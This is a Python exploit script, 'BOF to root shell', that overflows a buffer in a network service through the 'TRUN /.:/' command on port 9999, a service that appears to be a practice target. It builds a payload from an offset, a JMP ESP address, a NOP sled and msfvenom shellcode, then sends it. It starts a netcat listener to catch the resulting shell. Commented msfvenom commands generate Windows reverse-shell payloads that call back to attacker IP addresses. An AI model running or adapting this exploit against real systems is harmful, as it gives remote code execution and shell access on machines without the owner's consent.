#!/usr/bin/python3
#BOF to root shell
import sys,socket,argparse,subprocess,re,os
from pwn import p32


#####################################################################SETUP######################################################################################


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address')
    parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port. Default set to 9999')
    parser.add_argument('-c','--cmd',dest = 'cmd', help = 'Enter the name of server command being exploited. Default set to: \'TRUN /.:/\'')
    parser.add_argument('-o','--offset', dest = 'offset', help='Perform a manual search for EIP after BOF. Use pattern-offset meatsploit tool to find this offset. Default set to 2003' )
    parser.add_argument('-lp','--local-port',dest = 'lp', help = 'Enter call back port of attacker machine. Default set to port 1337. Netcat listener start automatically in a new gnome terminal. $~apt install gnome-terminal')
    parser.add_argument('-j','--jmpesp',dest = 'jmpesp',help = 'Enter sequence hex characters for jmp esp. Do not format sequence into little endian, format: 0xXXXXXX')
    parser.set_defaults(cmd = 'TRUN /.:/')
    parser.set_defaults(port = 9999)
    parser.set_defaults(lp = 1337)
    options = parser.parse_args()
    return options


def buf():
    pipecmd_pl = input('Enter msfvenom shellcode command with --format py > buf.py:')
    print(f'{fc.y}Generating payload please wait...{fc.end}')
    subprocess.check_output(pipecmd_pl,shell=True)
    from buf import buf
    return buf


def start_nc():
    command = 'nc -lvnp {}'.format(opt.lp)
    return os.system("gnome-terminal -e 'bash -c \""+command+";bash\"'")

def cmdSetup():
    cmd1 = input('Enter argument for payload. Leave blank if not needed: ')
    cmd1 = bytes(cmd1,'utf-8')
    return cmd1

def getPayloadType():
    inputChecker = False
    while inputChecker == False:
        setCmd = input('Stage commands to target? (y/n): ')
        setCmd = setCmd.strip()
        if setCmd == 'y':
            inputChecker = True
        elif setCmd == 'n':
            inputChecker = True
            
    return setCmd

def getJmpEsp():
    je = opt.jmpesp
    je = int(je,16)
    return p32(je)


#######################################################################COLOR####################################################################################  


class fc:
    rw = '\033[31;107m'
    r = '\033[38;5;196m'
    pink_violet = '\033[38;5;206;48;5;57m'
    end = '\033[0m'
    pink = '\033[38;5;206m'
    y = '\033[0;33;40m'
    purple = '\033[0;35m'
    white_green = '\033[37;42m'
    cyan = '\033[36m'
    g = '\033[38;5;154m'
    b = '\033[38;5;45m'


#############################################################################VAR#################################################################################


opt = get_args()
opt.offset = int(opt.offset)
gpl = getPayloadType()
overflow = opt.cmd + 'A' * opt.offset #for unstaged
overflow = overflow.encode() #for unstaged
enterSim = b'\r\n'
padding   = b'\x90' * 32 
jmpesp = getJmpEsp()
timeout = 5 # s.connect timeout
buf = buf()


###################################################################RUN###########################################################################################
#msfvenom -p windows/shell_reverse_tcp LHOST="192.168.241.133" LPORT=1337 EXITFUNC=thread -a x86 -b "\\x00" -f py > buf.py // 0x625011af
#msfvenom -p windows/shell_reverse_tcp LHOST="10.9.4.116" LPORT=1337 EXITFUNC=thread -a x86 -b "\\x00" -f py > buf.py //0x625014df 


try:


    if gpl == 'y':
        cmd1 = cmdSetup()
        stageCmd2PL = b'A' * opt.offset + jmpesp  + padding + buf
        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}, {fc.b}timeout set to{fc.end} {fc.purple}{timeout}{fc.end}.')
        print('\n')
        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Starting netcat listener on port {fc.end}{fc.g}{opt.lp}{fc.end}')
        start_nc()
        print(f'{fc.pink_violet}[+]{fc.end} {fc.end}{fc.b}Connecting to target...{fc.end}')
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((str(opt.ip), opt.port))
        s.recv(1024)
        s.recv(1024)
        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Connected to target.{fc.end}')
        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending stage 1:{fc.end} {fc.pink}{cmd1}{fc.end}')
        s.send(cmd1+enterSim)
        s.recv(1024)
        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Stage 1 sent.{fc.end}')
        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending stage 2: {str(len(stageCmd2PL)+len(enterSim))} bytes{fc.end}')
        s.send(stageCmd2PL+enterSim)
        s.recv(1024)
        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Stage 2 sent{fc.end}')
        s.close()
    
    
    elif gpl == 'n':
        print(jmpesp)
        buffer = overflow + jmpesp + padding + buf
        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}, {fc.b}timeout set to{fc.end} {fc.purple}{timeout}{fc.end}.')
        print('\n')
        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Starting netcat listener on port {fc.end}{fc.g}{opt.lp}{fc.end}')
        start_nc()
        print(f'{fc.pink_violet}[+]{fc.end} {fc.end}{fc.b}Connecting to target...{fc.end}')
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((str(opt.ip), opt.port))
        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Connected to target.{fc.end}')
        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending payload: {str(len(buffer))} bytes.{fc.end}')
        s.send(buffer)
        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Payload sent.{fc.end}')
        s.close()


except Exception as e:
        print(f'\tError: {fc.rw}{e}{fc.end}')
        sys.exit()


except KeyboardInterrupt:
        print('Abort')
